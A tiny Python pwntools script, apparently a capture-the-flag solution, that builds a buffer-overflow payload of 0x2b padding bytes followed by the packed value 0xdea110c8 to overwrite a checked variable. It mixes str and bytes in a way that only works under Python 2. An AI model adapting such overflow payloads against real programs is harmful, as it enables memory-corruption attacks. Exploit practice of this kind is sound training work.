from pwn import * 

payload = ""
payload += "0"*0x2b
print(payload)

payload += p32(0xdea110c8)
print(payload)
